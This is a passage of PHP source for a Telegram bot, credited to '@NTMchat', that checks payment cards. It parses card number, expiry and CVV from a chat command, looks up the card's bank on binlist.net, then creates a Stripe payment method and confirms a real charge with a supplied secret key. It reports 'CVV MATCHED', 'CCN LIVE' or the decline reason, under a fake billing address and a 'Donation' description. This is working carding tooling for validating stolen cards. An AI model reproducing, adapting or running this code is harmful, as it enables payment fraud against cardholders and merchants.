                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  SK IS AT RATE LIMIT</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                
                elseif ((strpos($result1, "Your card was declined.")) || (strpos($result2, "Your card was declined."))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Generic Declined</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  𝘾𝙖𝙧𝙙 Number Is Incorrect</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge $$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand%0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme %0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                else {
                sendMessage($chatId, "<b><u><i>Unknown Error. $msg1 - $msg2</i></u></b>", $message_id);
                };
                }
                
                elseif ((strpos($message, "/inr") === 0)||(strpos($message, "!inr") === 0)||(strpos($message, ".inr") === 0)){
        $message = substr($message, 4);
        $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
        $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
        $mes = multiexplode(array(":", "/", " ", "|"), $message)[2];
        $ano = multiexplode(array(":", "/", " ", "|"), $message)[3];
        $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
        if (empty($amt)) {
        $amt = '100';
        }
                $amount = $amt * 100;
                $lista = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                $fim = curl_exec($ch);
                $bank = GetStr($fim, '"bank":{"name":"', '"');
                $name = GetStr($fim, '"name":"', '"');
                $brand = GetStr($fim, '"brand":"', '"');
                $country = GetStr($fim, '"country":{"name":"', '"');
                $emoji = GetStr($fim, '"emoji":"', '"');
                $scheme = GetStr($fim, '"scheme":"', '"');
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $type = GetStr($fim, '"type":"', '"');
                if(strpos($fim, '"type":"credit"') !== false){
                $bin = 'Credit';
                }else{
                $bin = 'Debit';
                };
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]='.$mail.'@gmail.com&billing_details[name]=【🅽🆃🅼】@NTMchat Mittal');
                $result1 = curl_exec($ch);
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $tok1 = Getstr($result1,'"id": "','"');
                $msg1 = Getstr($result1,'"message": "','"');
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=inr&payment_method_types[]=card&description=【🅽🆃🅼】@NTMchat Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
                $result2 = curl_exec($ch);
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $httpCode = $info['http_code'];
                 $time = substr($time, 0, 4);
                $msg2 = Getstr($result2,'"message": "','"');
                $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
                if(strpos($result2, '"seller_message": "Payment complete."' )) {
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣ Charged ₹$amt ✅</b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif(strpos($result2, "insufficient_funds" )) {
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Insufficient Funds</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  3D 𝘾𝙖𝙧𝙙</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif(strpos($result2,'"cvc_check": "pass"')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Payment Cannot Be Completed</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif(strpos($result2,'"code": "incorrect_cvc"')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CCN LIVE ✅ ★ </b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Charged $$amt ✅</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt</b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif(strpos($result1,'"code": "incorrect_cvc"')){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CCN LIVE ✅ ★ </b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Charged $$amt ✅</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  『 ★ CVV MATCHED ✅ ★ 』</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Transaction Not Allowed</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt</b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Fraudulent</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕??𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Expired 𝘾𝙖𝙧𝙙</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, "generic_declined")) || (strpos($result2, "generic_declined"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Generic Declined</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);
                }
                elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Do Not Honor</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  SK IS AT RATE LIMIT</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                
                elseif ((strpos($result1, "Your card was declined.")) || (strpos($result2, "Your card was declined."))){
                sendMessage($chatId, "<b>%0A╔══════════════════════════%0A╟➣ 𝘾𝙖𝙧𝙙 ➣  <code>$lista</code></b>%0A<b>╟➣ 𝙎𝙩𝙖𝙩𝙪𝙨 ➣  Generic Declined</b>%0A<b>╟➣ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➣  Declined ❌</b>%0A<b>╟➣ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➣  Stripe Charge ₹$amt </b>%0A╟════════ 𝓑𝓘𝓝 𝓘𝓝𝓕𝓞 ════════%0A<b><b>╟➣ 𝗕𝗮𝗻𝗸 ➣</b> $bank %0A<b>╟➣ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➣</b> $name $emoji %0A<b>╟➣ 𝗕𝗿𝗮𝗻𝗱 ➣</b> $brand %0A<b>╟➣ 𝘾𝙖𝙧𝙙 ➣ </b> $scheme%0A<b>╟➣ 𝗧𝘆𝗽𝗲 ➣</b> $type </b>%0A<b>╟➣ 𝐓𝐈𝐌𝐄 𝐓𝐨𝐨𝐤 ➣</b> <b>$time 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.</b>%0A╟═══════════════════%0A<b>╟➣ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➣ </b> @$usernam%0A╟══════════════════════════%0A<b>╟➣ 𝗕𝗼𝘁 𝗕𝘆 ➣【🅽🆃🅼】@NTMchat</b>%0A<b>╚══════════════════════════</b>", $message_id);}
                elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
